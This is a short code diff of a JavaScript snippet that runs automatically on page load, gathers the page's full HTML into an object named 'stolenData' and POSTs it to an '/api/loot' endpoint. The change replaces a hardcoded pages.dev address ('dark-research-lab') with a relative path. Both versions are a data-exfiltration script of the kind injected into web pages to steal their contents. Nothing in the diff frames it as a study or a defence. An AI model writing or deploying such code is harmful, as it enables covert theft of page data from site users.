@@ -5,8 +5,8 @@ window.onload = function() {
         htmlDump: document.body.innerHTML
     };
 
-    // Send data to the Cloudflare Function running on the SAME domain
-    fetch("https://dark-research-lab.pages.dev/api/loot", {
+    // This sends the data to your Cloudflare backend
+    fetch("/api/loot", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(stolenData)
